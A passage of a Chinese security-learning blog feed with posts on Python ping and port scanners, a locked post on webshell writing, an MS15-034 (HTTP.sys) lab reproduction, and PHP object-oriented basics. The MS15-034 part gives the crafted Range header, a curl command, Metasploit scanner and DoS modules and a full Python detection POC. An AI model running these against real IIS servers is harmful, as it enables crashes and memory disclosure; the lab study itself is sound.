class="token punctuation">)</span>ip_list <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入您需要测试的IP段："</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> <span class="token punctuation">(</span>ip_list<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    scan <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>ping_ip<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    scan<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210610150314.png" loading="lazy"></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3.6</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># @Time    : 2021/5/30</span><span class="token comment"># @Author  : m0re</span><span class="token comment"># @Blog    : https://m0re.top/</span><span class="token triple-quoted-string string">"""首先定义一个端口扫描函数"""</span><span class="token keyword">import</span> socket<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">zhuangbi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    zhuangbi <span class="token operator">=</span> <span class="token triple-quoted-string string">"""                    ______                                                                                 /      \                                                                  _____  ____  /$$$$$$  |  ______    ______    _______   _______   ______   _______      /     \/    \ $$$  \$$ | /      \  /      \  /       | /       | /      \ /       \     $$$$$$ $$$$  |$$$$  $$ |/$$$$$$  |/$$$$$$  |/$$$$$$$/ /$$$$$$$/  $$$$$$  |$$$$$$$  |    $$ | $$ | $$ |$$ $$ $$ |$$ |  $$/ $$    $$ |$$      \ $$ |       /    $$ |$$ |  $$ |    $$ | $$ | $$ |$$ \$$$$ |$$ |      $$$$$$$$/  $$$$$$  |$$ \_____ /$$$$$$$ |$$ |  $$ |    $$ | $$ | $$ |$$   $$$/ $$ |      $$       |/     $$/ $$       |$$    $$ |$$ |  $$ |    $$/  $$/  $$/  $$$$$$/  $$/        $$$$$$$/ $$$$$$$/   $$$$$$$/  $$$$$$$/ $$/   $$/         """</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>zhuangbi<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始扫描：%s"</span><span class="token operator">%</span> target<span class="token punctuation">)</span>    <span class="token keyword">for</span> port <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        conn <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>portscan<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">portscan</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        Client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        Client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] %s:%d 开放"</span><span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        Client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    zhuangbi<span class="token punctuation">(</span><span class="token punctuation">)</span>    target <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入IP地址："</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span>target<span class="token punctuation">)</span>    end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"总耗时：%.2f s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这个虽然low，但是有个装X代码。觉得挺好玩的！<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210610150513.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>echo写马技巧和几个好玩的过狗一句话</title>
      <link href="/posts/c51060ee/"/>
      <url>/posts/c51060ee/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="噢，这是无效的密码。请检查并重试。" data-whm="哦，这些解密的内容无法验证，但您仍然可以看一下。"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="嘿~这里需要密码。" /><label>嘿~这里需要密码。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="fc62f8dc98c06f2a1c5a851f03d48183898be28ab91fb7a990ce3e7aaeb0345e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS15-034复现</title>
      <link href="/posts/9824b867/"/>
      <url>/posts/9824b867/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/8.jpg" loading="lazy"><br>水水水<del>~</del>继续水博客</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是针对MS15-034的复现。emmm，准备工作，先看看这个漏洞的介绍和危害。这是位于<code>HTTP.SYS</code>中的整数溢出漏洞。<code>UlpParseRange</code>处发生了整数溢出，而在此处导致了安全检查的绕过<br><code>HTTP.sys</code>中一处允许远程执行代码漏洞，编号为：CVE-2015-1635（MS15-034 ）。利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。根据公告显示，该漏洞对服务器系统造成了不小的影响，主要影响了包括Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2在内的主流服务器操作系统。</p><h1 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h1><p>这里漏洞搭建看网上好多博客没有写具体的，可能比较简单吧，那就不写了，可以看这个来进行搭建：<a href="https://jingyan.baidu.com/article/19192ad853224ce53f570748.html">https://jingyan.baidu.com/article/19192ad853224ce53f570748.html</a><br>我是用win7进行搭建。<br>win7: 192.168.137.141<br>kali: 192.168.137.129</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>以下几种检测方法</p><ul><li><p>第一种<br>f12抓包查看发现是IIS7.5<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210605004637.png" loading="lazy">、<br>还有查看到<code>Accept-Ranges</code>为<code>bytes</code>（解释：断点续传）<br>然后可以构造数据包，像这样</p><pre class="language-bash" data-language="bash"><code class="language-bash">GET / HTTP/1.1Host: stuffRange: <span class="token assign-left variable">bytes</span><span class="token operator">=</span><span class="token number">0</span>-18446744073709551615</code></pre><p>发送给IIS服务器看回显就可以知道是否存在此漏洞。<br>返回416状态码则存在此漏洞，返回400则不存在。</p></li><li><p>第二种<br>使用curl命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://192.168.137.141 -H <span class="token string">"Host: 192.168.137.141"</span> -H <span class="token string">"Range: bytes=0-18446744073709551615"</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210605010240.png" loading="lazy"><br>存在此漏洞。</p></li><li><p>第三种<br>metasploit的scan模块进行查看。<br><code>auxiliary/scanner/http/ms15_034_http_sys_memory_dump</code><br>然后同样使用metasploit下的dos模块进行攻击<br><code>auxiliary/dos/http/ms15_034_ulonglongadd</code><br>设置</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.137.141run</code></pre><p>即可进行攻击。<br>还有脚本POC</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">import</span> requests<span class="token triple-quoted-string string">"""@Zigoo0Another testing methods.curl -v [ipaddress]/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"wget -O /dev/null --header="Range: 0-18446744073709551615" http://[ip address]/"""</span><span class="token comment"># Coloring class</span><span class="token keyword">class</span> <span class="token class-name">colors</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>green <span class="token operator">=</span> <span class="token string">"\033[92m"</span>self<span class="token punctuation">.</span>blue <span class="token operator">=</span> <span class="token string">"\033[94m"</span>self<span class="token punctuation">.</span>bold <span class="token operator">=</span> <span class="token string">"\033[1m"</span>self<span class="token punctuation">.</span>yellow <span class="token operator">=</span> <span class="token string">"\033[93m"</span>self<span class="token punctuation">.</span>red <span class="token operator">=</span> <span class="token string">"\033[91m"</span>self<span class="token punctuation">.</span>end <span class="token operator">=</span> <span class="token string">"\033[0m"</span>color <span class="token operator">=</span> colors<span class="token punctuation">(</span><span class="token punctuation">)</span>banner <span class="token operator">=</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token triple-quoted-string string">'''This is a test POC for:MS15-034: HTTP.sys (IIS) DoS And Possible Remote Code Execution.By Ebrahim Hegazy @Zigoo0 \n'''</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token keyword">print</span> banner<span class="token comment">#Reading hosts from a text file to test multiple sites.</span>hosts <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">'[*] Enter the name of the list file: '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#Vulnerable hosts will go here.</span>vulnerable <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#Fixed hosts will go here.</span>fixed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#Defining the main function.</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token string">"[*] Testing "</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end <span class="token operator">+</span> url<span class="token keyword">try</span><span class="token punctuation">:</span><span class="token comment">#Defining the Headers.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span><span class="token string">"Range"</span><span class="token punctuation">:</span> <span class="token string">"bytes=0-18446744073709551615"</span><span class="token punctuation">,</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"https://github.com/zigoo0/"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">&#125;</span><span class="token comment">#Sending the Request.</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">416</span> <span class="token keyword">or</span> <span class="token string">"Requested Range Not Satisfiable"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment">#print r.status_code.</span><span class="token keyword">print</span> <span class="token string">"[*] %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">+</span> color<span class="token punctuation">.</span>red<span class="token operator">+</span><span class="token string">" is Vulnerable!\n"</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token comment">#Adding the vulnerable hosts to a SET for later use and to make sure it's a unique host.</span>vulnerable<span class="token punctuation">.</span>add<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#print r.status_code</span><span class="token keyword">print</span> <span class="token string">"[*] Seems %s "</span><span class="token operator">%</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">+</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token string">" is not vulnerable!\n"</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token comment">#Adding the non-vulnerable hosts to a SET for later use.</span>fixed<span class="token punctuation">.</span>add<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span><span class="token keyword">for</span> host <span class="token keyword">in</span> hosts<span class="token punctuation">:</span>url <span class="token operator">=</span> host<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment">#Printing the list of vulnerable sites.</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>red<span class="token operator">+</span><span class="token string">"[*] %s found to be vulnerable."</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>vulnerable<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token keyword">for</span> vuln <span class="token keyword">in</span> vulnerable<span class="token punctuation">:</span><span class="token keyword">print</span> <span class="token string">"[-] "</span><span class="token punctuation">,</span> vuln<span class="token comment">#Adding the vulnerable sites to a text file.</span>vulnz <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'vulnerable-hosts.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>vulnz<span class="token punctuation">.</span>write<span class="token punctuation">(</span>vuln<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>blue<span class="token operator">+</span><span class="token string">"[*] Vulnerable hosts added to "</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end <span class="token operator">+</span> <span class="token string">"vulnerable-hosts.txt"</span><span class="token comment">#Printing the number of fixed/not-vulnerable hosts.</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token string">"\n[*] %s found to be NOT vulnerable."</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fixed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token comment">#printing the refferences.</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token string">"\n[*] Please follow below link for more details about this vulnerabability and How to FIX it."</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end<span class="token keyword">print</span> <span class="token string">"[*] https://technet.microsoft.com/library/security/ms15-034"</span><span class="token keyword">print</span> <span class="token string">"[*] https://technet.microsoft.com/en-us/library/security/ms15-apr.aspx"</span><span class="token keyword">print</span> color<span class="token punctuation">.</span>green<span class="token operator">+</span><span class="token string">"[*] Don't forget to update your servers.\n"</span><span class="token operator">+</span>color<span class="token punctuation">.</span>end</code></pre><p>参考链接：<br>POC地址：<a href="https://github.com/zigoo0/MS15-034">https://github.com/zigoo0/MS15-034</a><br>参考博客：<a href="https://www.cnblogs.com/peterpan0707007/p/8529261.html">https://www.cnblogs.com/peterpan0707007/p/8529261.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之面向对象</title>
      <link href="/posts/94594340/"/>
      <url>/posts/94594340/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/193708-15779650287a6a.jpg" alt="m0re" loading="lazy"><br>开始水博客了<del>咕咕</del><br>跟着Mochazz师傅的博客学习</p><a id="more"></a><h1 id="0x01类"><a href="#0x01类" class="headerlink" title="0x01类"></a>0x01类</h1><p>关于PHP的类，由<code>class</code>关键字创建，然后使用new关键字实例化对象。其中变量称为属性，函数称为方法。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603143655.png" loading="lazy"></p><h1 id="0x02-类成员的访问控制"><a href="#0x02-类成员的访问控制" class="headerlink" title="0x02 类成员的访问控制"></a>0x02 类成员的访问控制</h1><p>Public：可以在任何地方被访问<br>Protected：可被其所在的类的子类和父类访问<br>Private：只能在类内部被访问，子类不能访问父类的私有属性<br>如未声明，默认为public</p><h1 id="0x03-常量"><a href="#0x03-常量" class="headerlink" title="0x03 常量"></a>0x03 常量</h1><p>使用const定义类常量<br>使用this关键字在类内部访问成员变量和方法<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603144329.png" loading="lazy"></p><h1 id="0x04-构造函数和析构函数"><a href="#0x04-构造函数和析构函数" class="headerlink" title="0x04 构造函数和析构函数"></a>0x04 构造函数和析构函数</h1><p>关于构造函数和析构函数的区别</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">animals</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>      <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$value1</span><span class="token punctuation">,</span><span class="token variable">$value2</span><span class="token punctuation">)</span><span class="token comment">//可以有参数</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "构造函数&lt;br>";</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//不可以有参数</span>      <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "析构函数&lt;br>";</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$dog</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">animals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>构造函数在使用new关键字创建对象时自动执行，可传入参数；析构函数在对象被销毁时自动执行，不能有参数。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603145106.png" loading="lazy"></p><h1 id="0x05-clone一个对象"><a href="#0x05-clone一个对象" class="headerlink" title="0x05 clone一个对象"></a>0x05 clone一个对象</h1><p>clone是将原对象的所有信息从内存中复制一份，存储在信开辟的内存中。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210603145347.png" loading="lazy"></p><h1 id="0x06-继承"><a href="#0x06-继承" class="headerlink" title="0x06 继承"></a>0x06 继承</h1><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">admin</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"I am <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">&#125;</span></span>.&lt;br>"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">admin</span><span class="token punctuation">&#123;</span>      <span class="token keyword">function</span> <span class="token function">who</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"manager of here"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$user1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"m0re"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">who</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603150500.png" loading="lazy"></p><h1 id="0x07-魔术方法"><a href="#0x07-魔术方法" class="headerlink" title="0x07 魔术方法"></a>0x07 魔术方法</h1><h2 id="clone-方法"><a href="#clone-方法" class="headerlink" title="__clone()方法"></a>__clone()方法</h2><p><code>__clone</code>方法会重写<code>clone</code>，当使用<code>clone</code>时，不仅会复制变量，还会执行<code>__clone</code>里面的代码<br>对象复制可以通过<code>clone</code>关键字来完成（如果可能，这将调用对象的 <code>__clone()</code> 方法）。对象中的 <code>__clone()</code> 方法不能被直接调用。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"正在clone对象"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$stu</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stu2</span> <span class="token operator">=</span> <span class="token variable">$stu</span><span class="token punctuation">;</span>    <span class="token variable">$stu3</span> <span class="token operator">=</span> <span class="token keyword">clone</span> <span class="token variable">$stu</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"I am __toString()."</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603200444.png" loading="lazy"></p><h2 id="autoload"><a href="#autoload" class="headerlink" title="__autoload()"></a>__autoload()</h2><p><code>__autoload()</code>方法会在第一次引用一个类时调用该方法，可以通过定义这个函数来启用类的自动加载</p><pre class="language-php" data-language="php"><code class="language-php">#Person.class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>      <span class="token keyword">function</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hello,world"</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>#flag.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$classname</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".class.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$person</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210603201115.png" loading="lazy"></p><h1 id="json数据"><a href="#json数据" class="headerlink" title="json数据"></a>json数据</h1><p>json_decode(string,bool)当第二个参数为true时，返回一个数组，默认为false返回一个对象。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"one"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"two"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"three"</span><span class="token operator">=</span><span class="token operator">></span><span class="token double-quoted-string string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"one"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"two"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token 